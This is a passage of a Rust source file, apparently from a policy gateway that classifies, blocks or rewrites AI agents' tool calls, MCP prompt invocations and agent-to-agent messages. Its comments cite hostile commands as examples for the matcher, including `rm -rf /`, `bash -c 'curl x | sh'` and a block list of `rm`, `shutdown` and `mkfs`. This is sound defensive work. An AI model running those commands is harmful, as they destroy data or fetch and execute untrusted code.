    pub name: &'a str,
    pub arguments: Option<&'a Value>,
    pub field_profiles: Option<&'a FieldProfileSet>,
    pub app_id: Option<&'a str>,
    pub mcp_server: Option<&'a str>,
}
impl<'a> TargetResolver for PromptInvocationResolver<'a> {
    fn resolve(&self, target: &str) -> Option<Vec<String>> {
        match target {
            "prompt_id" => self.prompt_id.map(|s| vec![s.to_string()]),
            t if t.starts_with("arg.") => {
                let canonical = &t[4..];
                resolve_canonical_arg(
                    self.arguments,
                    self.field_profiles,
                    self.name,
                    self.app_id,
                    self.mcp_server,
                    canonical,
                )
            }
            _ => None,
        }
    }
}

/// A2A `agent_calls` scope. The A2A wire names no tool and carries no
/// arguments — a call is a message addressed to an agent — so there is nothing
/// for the field-profile registry to canonicalize and no `arg.<f>` axis. The
/// agent itself is the rule's pivot (`a2a_agent_filter`); what remains to match
/// on is the message body.
///
/// `content` is the joined text of the message's text parts (on the response
/// phase: the agent's reply plus the text of any artifacts it produced) — the
/// prose an operator writes injection / exfiltration rules against. `data` is
/// the JSON of its structured (`data`) parts, the escape hatch for agents that
/// exchange machine payloads rather than prose. Both are empty when the message
/// carried no part of that kind, and a rule targeting the empty one simply
/// doesn't fire.
pub struct AgentCallResolver<'a> {
    pub content: &'a str,
    pub data: &'a str,
}
impl TargetResolver for AgentCallResolver<'_> {
    fn resolve(&self, target: &str) -> Option<Vec<String>> {
        match target {
            "content" => Some(vec![self.content.to_string()]),
            "data" => Some(vec![self.data.to_string()]),
            _ => None,
        }
    }
}

/// Look up `(tool_name, app_id, mcp_server, canonical_field)` in the profile
/// registry. When matched, fetch from `arguments[wire_field]` (or
/// `arguments[canonical_field]` when wire_field is unset) and normalise.
/// When no profile matches, fall back to `arguments[canonical_field]` raw.
fn resolve_canonical_arg(
    arguments: Option<&Value>,
    profiles: Option<&FieldProfileSet>,
    tool_name: &str,
    app_id: Option<&str>,
    mcp_server: Option<&str>,
    canonical_field: &str,
) -> Option<Vec<String>> {
    let args = arguments?;
    let (wire_field, normalizer) = profiles
        .and_then(|set| set.lookup(tool_name, app_id, mcp_server, canonical_field))
        .map(|m| (m.wire_field.unwrap_or(canonical_field), Some(m.normalizer)))
        .unwrap_or((canonical_field, None));
    let raw = args.get(wire_field).map(|v| value_to_match_string(v, normalizer))?;
    Some(match normalizer {
        Some(n) => crate::config::tool_rules_normalize::apply_forms(n, &raw),
        // Unprofiled: the value is matched as it arrived, and it is ONE form —
        // whatever it contains is text, never a boundary between forms.
        None => vec![raw],
    })
}

/// `target: "any_arg"` resolver: collect normalised values across every
/// canonical field the profile registry knows about for the tool. Every form
/// of every field is returned, so the evaluator's any-form match covers all of
/// them with a single condition.
///
/// Returns `None` when no profile exists for the tool or when none of the
/// matched profiles' `wire_field`s are present in `arguments` — that is the
/// intended tighter behaviour vs. the legacy raw-JSON `args` target.
fn resolve_any_canonical_arg(
    arguments: Option<&Value>,
    profiles: Option<&FieldProfileSet>,
    tool_name: &str,
    app_id: Option<&str>,
    mcp_server: Option<&str>,
) -> Option<Vec<String>> {
    let args = arguments?;
    let set = profiles?;
    let matches = set.lookup_all_fields(tool_name, app_id, mcp_server);
    if matches.is_empty() {
        return None;
    }
    let mut forms: Vec<String> = Vec::new();
    for (field, m) in &matches {
        let wire = m.wire_field.unwrap_or(field.as_str());
        if let Some(raw) = args.get(wire).map(|v| value_to_match_string(v, Some(m.normalizer))) {
            forms.extend(crate::config::tool_rules_normalize::apply_forms(
                m.normalizer,
                &raw,
            ));
        }
    }
    (!forms.is_empty()).then_some(forms)
}

/// Parse an `argv` target. `None` when `target` is not one at all;
/// `Some(None)` for the bare token list; `Some(Some(i))` for `argv[i]`.
///
/// The index must be plain decimal digits, so `argv[]`, `argv[-1]`,
/// `argv[0x2]` and an index too large for `usize` are all "not an argv
/// target" — which `validate` reports as an invalid target rather than
/// silently resolving to nothing.
pub fn parse_argv_target(target: &str) -> Option<Option<usize>> {
    if target == "argv" {
        return Some(None);
    }
    let index = target.strip_prefix("argv[")?.strip_suffix(']')?;
    if index.is_empty() || !index.bytes().all(|b| b.is_ascii_digit()) {
        return None;
    }
    index.parse::<usize>().ok().map(Some)
}

/// `target: "argv"` / `argv[<n>]` resolver: the tokens of the tool's
/// shell-normalised arguments.
///
/// Only fields the profile registry registered with the `shell` normaliser are
/// read — argv is a property of a command line, and the normaliser declaration
/// is where an operator says which field is one. A tool with no `shell` field
/// (or no profile at all) resolves to `None`, so the condition fails rather
/// than matching something that was never a command; that is the same
/// deliberate tightness `any_arg` has.
///
/// Every candidate argv from every shell field contributes its own forms, so
/// the evaluator's any-form match ORs across statements, wrapper layers and
/// fields alike. Forms are sorted and deduplicated — a command that repeats a
/// token contributes it once.
fn resolve_argv(
    arguments: Option<&Value>,
    profiles: Option<&FieldProfileSet>,
    tool_name: &str,
    app_id: Option<&str>,
    mcp_server: Option<&str>,
    index: Option<usize>,
) -> Option<Vec<String>> {
    let args = arguments?;
    let set = profiles?;
    let mut forms: Vec<String> = Vec::new();
    for (field, m) in &set.lookup_all_fields(tool_name, app_id, mcp_server) {
        if m.normalizer != crate::config::tool_rules_normalize::Normalizer::Shell {
            continue;
        }
        let wire = m.wire_field.unwrap_or(field.as_str());
        let Some(raw) = args.get(wire).map(|v| value_to_match_string(v, Some(m.normalizer))) else {
            continue;
        };
        for normalized in crate::config::tool_rules_normalize::apply_forms(m.normalizer, &raw) {
            for argv in crate::config::tool_rules_normalize::shell_argv(&normalized) {
                match index {
                    Some(i) => forms.extend(argv.get(i).map(|t| (*t).to_string())),
                    None => forms.extend(argv.iter().map(|t| (*t).to_string())),
                }
            }
        }
    }
    if forms.is_empty() {
        return None;
    }
    forms.sort();
    forms.dedup();
    Some(forms)
}

/// The text a rule reads an argument's value as. A string is itself. A list
/// in a field marked as a shell command is an argv — one command, a word per
/// element (Codex's `shell` function, a Responses `local_shell_call`) — and
/// reads as its string words joined by spaces, so the shell normaliser sees the
/// command rather than the JSON punctuation around it: `["rm","-rf","/"]` read
/// as its JSON text never contains `rm -rf /`. The words are NOT re-quoted: a
/// word carrying a separator (`["bash", "-c", "curl x | sh"]`) is read as the
/// statements it holds, so a wrapper is unwrapped and every command in it is a
/// command a rule reads — over-reading, the safe direction for a policy. What
/// the shell reading would take for syntax that hides words — a `#` starting a
/// comment, a quote gluing the words after it into one, a backslash — is
/// escaped, since exec passes each word as it is. An element that is not a
/// string is no word of a command and is left out.
/// Locked by `an_argv_array_reads_as_the_command_line_it_spells`,
/// `a_separator_inside_a_word_is_read_as_one`.
fn value_to_match_string(v: &Value, normalizer: Option<crate::config::tool_rules_normalize::Normalizer>) -> String {
    match v {
        Value::String(s) => s.clone(),
        Value::Array(words)
            if normalizer == Some(crate::config::tool_rules_normalize::Normalizer::Shell)
                && words.iter().any(Value::is_string) =>
        {
            words.iter().filter_map(Value::as_str).map(escape_hiding_syntax).collect::<Vec<_>>().join(" ")
        }
        other => other.to_string(),
    }
}

/// `word` with every character the shell reading would take as syntax that
/// hides words (`#`, `'`, `"`, `\`) escaped, so it reads as written.
fn escape_hiding_syntax(word: &str) -> String {
    let mut out = String::with_capacity(word.len());
    for c in word.chars() {
        if matches!(c, '#' | '\'' | '"' | '\\') {
            out.push('\\');
        }
        out.push(c);
    }
    out
}

// ─── MCP namespacing ────────────────────────────────────────────────

/// Parse the `mcp__<server>__<local_name>` tool-name convention used by
/// MCP-aware clients. Returns `(server, local_name)` on a clean match,
/// `None` otherwise (no `mcp__` prefix, empty server, or empty local part).
///
/// Server identity is the segment between the first two `__` separators;
/// any trailing `__` in the local name is preserved (`mcp__fs__a__b` →
/// `("fs", "a__b")`) since some MCP servers expose nested-namespaced tools.
pub fn parse_mcp_namespace(tool_name: &str) -> Option<(&str, &str)> {
    let body = tool_name.strip_prefix("mcp__")?;
    let sep = body.find("__")?;
    let server = &body[..sep];
    let local = &body[sep + 2..];
    if server.is_empty() || local.is_empty() {
        return None;
    }
    Some((server, local))
}

// ─── Convenience: classify_tool_call ────────────────────────────────

/// Walk response/tool_calls rules and return the first match's classification.
/// Returns the synthetic "unknown" fallback when no rule matches.
///
/// Resolves the `tool_id` once via `field_profiles` (using the wire tool name
/// and the parsed MCP namespace if applicable) so the result includes both
/// `tool_id` and the resolving `profile_id` for downstream display.
pub fn classify_tool_call(
    rules: &[Rule],
    model: Option<&str>,
    app_id: Option<&str>,
    field_profiles: Option<&FieldProfileSet>,
    tool_name: &str,
    arguments: Option<&Value>,
) -> RiskResult {
    let (effective_name, mcp_server) = match parse_mcp_namespace(tool_name) {
        Some((server, local)) => (local, Some(server)),
        None => (tool_name, None),
    };
    let lookup_id = field_profiles.and_then(|set| {
        set.resolve_tool_id_with_profile(effective_name, app_id, mcp_server)
    });
    let tool_id = lookup_id.as_ref().map(|m| m.tool_id.clone());
    let profile_id = lookup_id.as_ref().and_then(|m| m.profile_id.clone());

    let scoped = extract_for(
        rules,
        Phase::Response,
        Scope::ToolCalls,
        RuleAxes {
            model,
            app_id,
            mcp_server,
            ..Default::default()
        },
    );
    let resolver = ToolCallResolver {
        name: effective_name,
        arguments,
        field_profiles,
        app_id,
        mcp_server,
        tool_id: tool_id.as_deref(),
    };
    // A shell call that only applies a patch is also read as the patch tool,
    // and that reading can only add a block (`patch_block`).
    let own = scoped.iter().find(|rule| evaluate(rule, &resolver));
    if own.is_none_or(|rule| rule.action.kind() != ActionKind::Block)
        && let Some(block) = patch_block(&scoped, &resolver)
    {
        return rule_to_result(block, tool_id, profile_id);
    }
    if let Some(rule) = own {
        return rule_to_result(rule, tool_id, profile_id);
    }
    RiskResult {
        id: None,
        risk: "unknown".to_string(),
        title: None,
        description: None,
        action: "allow".to_string(),
        pattern: None,
        profile_id,
        tool_id,
    }
}

fn rule_to_result(rule: &Rule, tool_id: Option<String>, profile_id: Option<String>) -> RiskResult {
    RiskResult {
        id: Some(rule.id.clone()),
        risk: rule.risk.clone(),
        title: rule.title.clone(),
        description: rule.description.clone(),
        action: action_str(&rule.action),
        pattern: pattern_summary(rule),
        profile_id,
        tool_id,
    }
}

fn action_str(a: &RuleAction) -> String {
    match a {
        RuleAction::Classify => "classify".to_string(),
        RuleAction::Block => "block".to_string(),
        RuleAction::Replace { .. } => "replace".to_string(),
        RuleAction::Substitute { .. } => "substitute".to_string(),
        RuleAction::InterceptOnly { .. } => "intercept_only".to_string(),
    }
}

fn pattern_summary(rule: &Rule) -> Option<String> {
    rule.conditions.first().map(|c| match c.op {
        Op::Glob | Op::Regex | Op::Equals | Op::Detector => {
            c.value.as_str().unwrap_or("").to_string()
        }
        Op::ContainsAny | Op::ContainsWordAny | Op::In => c
            .value
            .as_array()
            .map(|arr| {
                arr.iter()
                    .filter_map(|v| v.as_str())
                    .collect::<Vec<_>>()
                    .join(", ")
            })
            .unwrap_or_default(),
    })
}

// ─── Glob matcher (kept public — used by `model_filter` consumers) ───

/// Match a value against a pipe-separated case-insensitive glob pattern.
/// Each alternative supports `*` (all), `*suffix`, `prefix*`, `*contains*`,
/// or exact match.
pub fn matches_glob(value: &str, pattern: &str) -> bool {
    pattern.split('|').any(|alt| matches_single_glob(value, alt.trim()))
}

fn matches_single_glob(value: &str, pattern: &str) -> bool {
    let v = value.to_lowercase();
    let p = pattern.to_lowercase();
    if p == "*" {
        return true;
    }
    let starts = p.starts_with('*');
    let ends = p.ends_with('*');
    let trimmed = p.trim_matches('*');
    match (starts, ends) {
        (true, true) => v.contains(trimmed),
        (true, false) => v.ends_with(trimmed),
        (false, true) => v.starts_with(trimmed),
        (false, false) => v == p,
    }
}

/// Substring scan with word-boundary anchoring on both ends. A "word
/// character" is ASCII `[A-Za-z0-9_]`; non-ASCII bytes (UTF-8 continuation
/// bytes, accented chars, CJK, etc.) are treated as non-word boundaries —
/// `"caféreboot"` will match needle `"reboot"`. This is a deliberate trade
/// for the dominant use case (matching ASCII shell/SQL keywords against
/// free text); operators needing strict Unicode word semantics should use
/// `Op::Regex` with `\b`. Both `haystack` and `needle` must already be
/// lowercased — the caller does that once for the whole condition.
fn contains_word(haystack: &str, needle: &str) -> bool {
    if needle.is_empty() || needle.len() > haystack.len() {
        return false;
    }
    let h = haystack.as_bytes();
    let n = needle.as_bytes();
    let is_word = |b: u8| b.is_ascii_alphanumeric() || b == b'_';
    // Walk every byte position where `needle` could start.
    for i in 0..=h.len() - n.len() {
        if &h[i..i + n.len()] != n {
            continue;
        }
        // Boundary check: position before needle must be non-word (or start);
        // position after needle must be non-word (or end).
        let left_ok = i == 0 || !is_word(h[i - 1]);
        let right_ok = i + n.len() == h.len() || !is_word(h[i + n.len()]);
        if left_ok && right_ok {
            return true;
        }
    }
    false
}

/// Compiled `Op::Regex` patterns, keyed by the pattern itself.
///
/// `condition_matches` runs per tool call **per resolved form**, and the shell
/// normaliser emits several forms for one command — so compiling the pattern
/// inline put a regex parser on the request path, once per form. It stayed
/// unnoticed while only operator-authored rules used `regex`; a seeded builtin
/// matching every `shell_exec` call does not have that luxury.
///
/// The key space is every pattern this process has ever **evaluated**, not the
/// rules that currently exist: an operator iterating on a regex rule leaves the
/// superseded pattern behind, and nothing here observes a config apply to drop
/// it. That is why the map is capped — past the cap it stops inserting and falls
/// back to compiling inline, so the steady state is bounded while the hot path
/// stays cached. Tenant-authored input must never be able to grow a global map
/// without limit.
///
/// An invalid pattern caches as `None`, so a rule that cannot compile costs one
/// failed parse rather than one per request; it still matches nothing, which is
/// the same fail-open reading the inline compile had.
///
/// `Arc<Regex>` rather than `Regex`: the crate's `Clone` allocates a fresh
/// lazy-DFA cache pool, so handing out a clone per call would re-warm the DFA
/// every time and give back much of what the cache saves.
static COMPILED_REGEXES: std::sync::LazyLock<dashmap::DashMap<String, Option<Arc<Regex>>>> =
    std::sync::LazyLock::new(dashmap::DashMap::new);

/// Distinct patterns held before the cache stops growing. Far above any real
/// rule set; it exists so a pathological edit loop cannot grow the map forever.
const MAX_COMPILED_REGEXES: usize = 4096;

fn compiled_regex(pattern: &str) -> Option<Arc<Regex>> {
    if let Some(hit) = COMPILED_REGEXES.get(pattern) {
        return hit.clone();
    }
    let compiled = Regex::new(pattern).ok().map(Arc::new);
    if COMPILED_REGEXES.len() < MAX_COMPILED_REGEXES {
        COMPILED_REGEXES.insert(pattern.to_string(), compiled.clone());
    }
    compiled
}

fn condition_matches(cond: &MatchCondition, value: &str) -> bool {
    match cond.op {
        Op::Glob => {
            let pat = cond.value.as_str().unwrap_or("");
            !pat.is_empty() && matches_glob(value, pat)
        }
        Op::ContainsAny => {
            let v_lower = value.to_lowercase();
            cond.value
                .as_array()
                .map(|arr| {
                    arr.iter().any(|s| {
                        let needle = s.as_str().unwrap_or("").to_lowercase();
                        !needle.is_empty() && v_lower.contains(&needle)
                    })
                })
                .unwrap_or(false)
        }
        Op::ContainsWordAny => {
            let v_lower = value.to_lowercase();
            cond.value
                .as_array()
                .map(|arr| {
                    arr.iter().any(|s| {
                        let needle = s.as_str().unwrap_or("").to_lowercase();
                        !needle.is_empty() && contains_word(&v_lower, &needle)
                    })
                })
                .unwrap_or(false)
        }
        Op::Regex => {
            let pat = cond.value.as_str().unwrap_or("");
            !pat.is_empty() && compiled_regex(pat).is_some_and(|rx| rx.is_match(value))
        }
        Op::Equals => {
            let pat = cond.value.as_str().unwrap_or("");
            !pat.is_empty() && value == pat
        }
        Op::In => cond
            .value
            .as_array()
            .map(|arr| {
                arr.iter()
                    .any(|s| s.as_str().is_some_and(|needle| !needle.is_empty() && needle == value))
            })
            .unwrap_or(false),
        // A detector this build doesn't implement does NOT match: validation
        // refuses to store an unknown name, so reaching here means a rule from
        // a newer admin, and matching everything would deny every call the
        // rule sees. See `tool_rules_detectors`.
        Op::Detector => cond
            .value
            .as_str()
            .and_then(|name| crate::config::tool_rules_detectors::detect(name, value))
            .unwrap_or(false),
    }
}

// ─── Validation (admin-write entry point) ───────────────────────────

#[derive(Debug)]
pub enum ValidationError {
    /// `(phase, scope, action.kind)` is not a permitted combination.
    ScopeForbidsAction {
        phase: Phase,
        scope: Scope,
        action: ActionKind,
    },
    /// A condition's `target` isn't in the allowed set for this scope.
    InvalidTarget { target: String, scope: Scope },
    /// `op` is reserved for `target: tool_id` and used elsewhere (or
    /// vice-versa: a tool_id condition with the wrong op).
    InvalidOpForTarget { target: String, op: Op },
    /// A regex (in a condition or action) failed to compile.
    InvalidRegex { which: String, error: String },
    /// `risk` field empty or not one of the recognised levels.
    InvalidRiskLevel { value: String },
    /// `op == "contains_any"` (or `in`) but `value` isn't a non-empty array of strings.
    InvalidArrayValue,
    /// `op` requires a string `value` but got something else.
    InvalidScalarValue { target: String, op: Op },
    /// `model_filter` was set to an empty string — would silently exclude
    /// every model from the rule. Use `null` to clear instead.
    InvalidModelFilter,
    /// `app_filter` was set to an empty string. Use `null` to clear instead.
    InvalidAppFilter,
    /// `mcp_server_filter` was set to an empty string. Use `null` to clear instead.
    InvalidMcpServerFilter,
    /// `a2a_agent_filter` was set to an empty string. Use `null` to clear instead.
    InvalidA2aAgentFilter,
    /// A needle carries the structural form separator (`\u{0}`). No canonical
    /// value can contain one — `tool_rules_normalize::apply_forms` strips it
    /// coming and going, because the separator is what tells one canonical form
    /// from the next — so such a rule would store, display and never fire.
    NeedleCarriesFormSeparator { target: String },
    /// `op == "detector"` but `value` doesn't name a detector this build
    /// implements. Refused at write time, because a rule naming an unknown
    /// detector would validate and then never fire.
    UnknownDetector { name: String },
    /// `Replace` action with no `regex`, no `with`, and `drop: false` —
    /// equivalent to wholesale-replacing matched content with the default
    /// `[redacted]` sentinel. Almost always an operator footgun: require an
    /// explicit choice of one of (regex+with) | (with) | (drop: true).
    AmbiguousReplaceAction,
}

const VALID_RISK_LEVELS: &[&str] = &["safe", "caution", "danger", "unknown"];

/// Validate `(phase, scope, action.kind)` is allowed.
pub fn scope_allows_action(phase: Phase, scope: Scope, action: ActionKind) -> bool {
    use ActionKind::*;
    use Phase::*;
    use Scope::*;
    matches!(
        (phase, scope, action),
        (
            Request,
            ToolDefinitions,
            Block | Classify | Substitute | InterceptOnly
        ) | (Request, ToolResults, Replace | Classify)
            | (Response, ToolCalls, Block | Replace | Classify)
            | (Request, ResourceReads, Block | Replace | Classify)
            | (Response, ResourceReads, Replace | Classify)
            | (Request, PromptInvocations, Block | Replace | Classify)
            // An agent call can be refused before it leaves the gateway; the
            // reply cannot — the remote agent has already done the work — so
            // the response phase rewrites content (`Replace`, `drop` included)
            // rather than pretending the call never happened.
            | (Request, AgentCalls, Block | Replace | Classify)
            | (Response, AgentCalls, Replace | Classify)
    )
}

/// Whether a target names one canonical argument field — `arg.<f>` with a
/// non-empty `<f>`.
///
/// The bare prefix is refused rather than stored: the canonical field is then
/// the empty string, which no argument map holds, so the rule would validate,
/// display, and never match anything. The same module already refuses an empty
/// `app_filter` / `mcp_server` / `server_type` for that reason — a `block` rule
/// that can never fire reads as protection that is not there.
fn arg_target_names_a_field(target: &str) -> bool {
    target
        .strip_prefix("arg.")
        .is_some_and(|field| !field.is_empty())
}

pub fn scope_allows_target(scope: Scope, target: &str) -> bool {
    match scope {
        Scope::ToolDefinitions => target == "tool_id",
        Scope::ToolResults => {
            target == "tool_id"
                || target == "any_arg"
                || target == "content"
                || arg_target_names_a_field(target)
                || parse_argv_target(target).is_some()
        }
        Scope::ToolCalls => {
            target == "tool_id"
                || target == "any_arg"
                || arg_target_names_a_field(target)
                || parse_argv_target(target).is_some()
        }
        Scope::ResourceReads => {
            target == "resource_id"
                || target == "uri"
                || target == "content"
                || arg_target_names_a_field(target)
        }
        Scope::PromptInvocations => target == "prompt_id" || arg_target_names_a_field(target),
        Scope::AgentCalls => target == "content" || target == "data",
    }
}

pub fn validate(rule: &Rule) -> Result<(), ValidationError> {
    if !VALID_RISK_LEVELS.contains(&rule.risk.as_str()) {
        return Err(ValidationError::InvalidRiskLevel {
            value: rule.risk.clone(),
        });
    }
    if !scope_allows_action(rule.phase, rule.scope, rule.action.kind()) {
        return Err(ValidationError::ScopeForbidsAction {
            phase: rule.phase,
            scope: rule.scope,
            action: rule.action.kind(),
        });
    }
    if let Some(filter) = &rule.model_filter
        && filter.trim().is_empty()
    {
        return Err(ValidationError::InvalidModelFilter);
    }
    if let Some(filter) = &rule.app_filter
        && filter.trim().is_empty()
    {
        return Err(ValidationError::InvalidAppFilter);
    }
    if let Some(filter) = &rule.mcp_server_filter
        && filter.trim().is_empty()
    {
        return Err(ValidationError::InvalidMcpServerFilter);
    }
    if let Some(filter) = &rule.a2a_agent_filter
        && filter.trim().is_empty()
    {
        return Err(ValidationError::InvalidA2aAgentFilter);
    }
    for cond in &rule.conditions {
        if !scope_allows_target(rule.scope, &cond.target) {
            return Err(ValidationError::InvalidTarget {
                target: cond.target.clone(),
                scope: rule.scope,
            });
        }
        // `equals` and `in` are reserved for the canonical ID targets
        // (`tool_id`, `resource_id`, `prompt_id`); everything else is
        // forbidden on those targets (they're values with no fuzzy-match
        // semantics) and reciprocally those ops are forbidden elsewhere.
        let is_id_target = matches!(
            cond.target.as_str(),
            "tool_id" | "resource_id" | "prompt_id"
        );
        // `argv` / `argv[n]` resolve to whole shell tokens rather than free
        // text, so an exact match means something there that it does not on a
        // prose target — `argv[0] in ["rm", "shutdown", "mkfs"]` is the point
        // of the target. It keeps every other op too: a token is still a
        // string, so glob / regex / contains / detector all read it.
        let is_argv_target = parse_argv_target(&cond.target).is_some();
        match (is_id_target, cond.op) {
            (true, Op::Equals | Op::In) => {}
            (true, _) => {
                return Err(ValidationError::InvalidOpForTarget {
                    target: cond.target.clone(),
                    op: cond.op,
                });
            }
            (false, Op::Equals | Op::In) if !is_argv_target => {
                return Err(ValidationError::InvalidOpForTarget {
                    target: cond.target.clone(),
                    op: cond.op,
                });
            }
            _ => {}
        }
        match cond.op {
            Op::Glob | Op::Regex | Op::Equals => {
                if cond.value.as_str().map(|s| s.is_empty()).unwrap_or(true) {
                    return Err(ValidationError::InvalidScalarValue {
                        target: cond.target.clone(),
                        op: cond.op,
                    });
                }
                if matches!(cond.op, Op::Regex)
                    && let Some(s) = cond.value.as_str()
                    && let Err(e) = Regex::new(s)
                {
                    return Err(ValidationError::InvalidRegex {
                        which: format!("match[{}].value (regex)", cond.target),
                        error: e.to_string(),
                    });
                }
            }
            Op::ContainsAny | Op::ContainsWordAny | Op::In => {
                let arr = cond.value.as_array().ok_or(ValidationError::InvalidArrayValue)?;
                if arr.is_empty()
                    || !arr.iter().all(|v| v.as_str().is_some_and(|s| !s.is_empty()))
                {
                    return Err(ValidationError::InvalidArrayValue);
                }
            }
            Op::Detector => {
                let name = cond.value.as_str().unwrap_or("");
                if !crate::config::tool_rules_detectors::is_known(name) {
                    return Err(ValidationError::UnknownDetector {
                        name: name.to_string(),
                    });
                }
            }
        }
        // A needle carrying the form separator can never match anything: the
        // canonicalisers strip it from every value the matcher sees, precisely
        // so nothing but the engine can say where one form ends. Refused for
        // the same reason as an empty filter above — a rule that stores and
        // then silently never fires reads as protection that is not there.
        let carries_separator = match &cond.value {
            Value::String(s) => s.contains(crate::config::tool_rules_normalize::MULTIFORM_SEP),
            Value::Array(items) => items.iter().any(|v| {
                v.as_str().is_some_and(|s| {
                    s.contains(crate::config::tool_rules_normalize::MULTIFORM_SEP)
                })
            }),
            _ => false,
        };
        if carries_separator {
            return Err(ValidationError::NeedleCarriesFormSeparator {
                target: cond.target.clone(),
            });
        }
    }
    if let RuleAction::Replace { regex, with, drop } = &rule.action {
        if let Some(rx) = regex
            && let Err(e) = Regex::new(rx)
        {
            return Err(ValidationError::InvalidRegex {
                which: "action.regex".to_string(),
                error: e.to_string(),
            });
        }
        // Reject the all-defaults Replace — operator must explicitly pick
        // one of (regex+with) | (with) | (drop: true). Empty `with` strings
        // are tolerated when paired with a regex (capture-group-only rewrite)
        // but not standalone, since that's identical to the default sentinel
        // and was almost certainly unintentional.
        let has_explicit_choice = regex.is_some() || with.is_some() || *drop;
        if !has_explicit_choice {
            return Err(ValidationError::AmbiguousReplaceAction);
        }
    }
    Ok(())
}

// ─── Field profiles (per-(tool, app|mcp, field) registry) ───────────

/// Maps a raw `(tool_name, app_id|mcp_server)` to a canonical `tool_id`,
/// and per-arg `field` to the wire field + normaliser. Operators register
/// these per-client so a single rule (`tool_id = read_file`,
/// `arg.path glob /etc/*`) catches every client's variant of the same
/// conceptual tool, and so obfuscation tricks (whitespace, percent-encoding,
/// case) are defeated by the normaliser before matching.
///
/// Disambiguation: `server_type`, `mcp_server`, and `app_filter` are mutually
/// exclusive on a given profile. A profile sets exactly one (or none, for a
/// generic fallback). Lookup precedence is:
///   1. `server_type` matches an inbound `DomainTool.server_type` (Anthropic
///      `web_search_20250305`, OpenAI Responses `web_search_preview`, Gemini
///      `google_search`, …)
///   2. `mcp_server` matches the parsed MCP namespace
///   3. `app_filter` matches the request's app_id
///   4. Generic (none set)
///
/// Then by `priority` ASC, then by load position.
#[derive(Debug, Clone, Serialize, Deserialize, ToSchema)]
pub struct FieldProfile {
    /// Stable operator-visible identifier (e.g. `TFP-claude-Bash-command`).
    /// Surfaces in the discovery/registration UI and audit-style logs so
    /// reviewers can trace why a field was canonicalised a specific way.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub id: Option<String>,
    /// Human-readable description ("Claude Code Bash tool — shell command").
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub description: Option<String>,
    /// Provenance tag, e.g. `"claude-code:builtin"`, `"mcp-registry:filesystem@1.0"`.
    /// Display-only — the engine doesn't read it.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub source: Option<String>,
    /// Canonical concept identifier (e.g. `shell_exec`, `read_file`). Rules
    /// pivot on this id rather than tool-name globs. Free-form string —
    /// `tool_ids.json` is documentation, not an enforced enum.
    pub tool_id: String,
    /// Pipe-separated case-insensitive glob over tool names. Same syntax as
    /// `Rule.match[].value` for `glob` conditions. For MCP-namespaced tools
    /// (`mcp__<server>__<tool>`), this matches the unprefixed local name —
    /// `mcp_server` carries the server identity separately.
    pub tool_pattern: String,
    /// Optional pipe-separated glob over the request's `app_id`. Mutually
    /// exclusive with `mcp_server` — a profile is either app-scoped or
    /// MCP-server-scoped, never both.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub app_filter: Option<String>,
    /// Optional MCP server identifier. When set, this profile only matches
    /// when the wire tool name is `mcp__<server>__<local>` and `<server>`
    /// equals (case-insensitively) this value, OR when the engine was given
    /// an out-of-band `mcp_server` hint matching this value.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub mcp_server: Option<String>,
    /// Optional server-side server-tool discriminator. When set, this
    /// profile matches only when the inbound `DomainTool.server_type`
    /// equals this value (case-insensitively) — covers Anthropic
    /// `web_search_20250305`, OpenAI Responses `web_search_preview`,
    /// Gemini `google_search`, and any future native server-tool. The
    /// `ServerType` precedence tier outranks `mcp_server`, `app_filter`,
    /// and generic; consult `lookup_with_server_type` /
    /// `resolve_tool_id_for_definition` to drive the lookup with a
    /// `server_type` hint.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub server_type: Option<String>,
    /// Canonical arg field name (e.g. `command`, `url`, `path`). Rules
    /// reference this in `arg.<field>` conditions. The engine maps this to
    /// `wire_field` (or `field` when `wire_field` is unset) when fetching
    /// the value from `arguments`.
    pub field: String,
    /// Optional actual arg key on the wire. Defaults to `field` when null.
    /// Use this when the client emits a different name than the canonical:
    /// `field: "path"`, `wire_field: "target_file"` for Cursor, etc.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub wire_field: Option<String>,
    /// Which normaliser to apply. Hardcoded set; unknown values fail
    /// deserialisation.
    pub normalizer: crate::config::tool_rules_normalize::Normalizer,
    /// Lower wins on overlapping `(tool_pattern, field)` matches. Default 100.
    /// Stable-sorted with array position as the tiebreaker so manual order
    /// still controls equal-priority entries.
    #[serde(default = "default_priority")]
    pub priority: i32,
    /// Server-managed: `true` on initial seed, `false` after the first PATCH/PUT.
    /// Mirrors [`Rule::is_builtin`]. Ignored on incoming client payloads.
    #[serde(default)]
    pub is_builtin: bool,
}

/// Result of a successful `(tool_name, app_id, mcp_server, field)` lookup.
#[derive(Debug, Clone)]
pub struct FieldMatch<'a> {
    pub tool_id: &'a str,
    pub wire_field: Option<&'a str>,
    pub normalizer: crate::config::tool_rules_normalize::Normalizer,
    pub profile_id: Option<&'a str>,
}

/// Result of a `(tool_name, app_id, mcp_server)` → tool_id lookup.
#[derive(Debug, Clone)]
pub struct ToolIdMatch {
    pub tool_id: String,
    pub profile_id: Option<String>,
}

/// Pre-sorted bag of [`FieldProfile`]s. Construct once per snapshot via
/// [`FieldProfileSet::new`]; lookup short-circuits literal `tool_pattern` /
/// `app_filter` profiles through a `(tier, scope, tool)` hash index and
/// only falls back to a glob walk for genuinely glob-shaped profiles.
#[derive(Debug, Clone, Default)]
pub struct FieldProfileSet {
    profiles: Vec<FieldProfile>,
    /// Hash index over profiles whose `tool_pattern` (and `app_filter` for
    /// App-tier profiles) is a literal — the 95th-percentile case. Keyed by
    /// `(tier, scope_key_lower, tool_pattern_lower)` where `scope_key_lower`
    /// is the lowercased `mcp_server` (Mcp tier), the lowercased `app_filter`
    /// (App tier), or `""` (Generic tier). Each value is the list of profile
    /// indices that share the key, kept in pre-sorted `(priority, position)`
    /// order so `first()` is the highest-priority literal match.
    literal_index: std::collections::HashMap<(Specificity, String, String), Vec<usize>>,
    /// Indices into `profiles` for non-literal profiles (`*` / `|` in
    /// `tool_pattern`, or `*` / `|` in `app_filter`). Walked as a fallback
    /// when the literal index probe misses. Kept in **ascending order** —
    /// because `new()` builds it inside `profiles.iter().enumerate()` over
    /// a `profiles` Vec already sorted by `(priority, original-position)`,
    /// each `push(i)` lands at a strictly larger index than the previous,
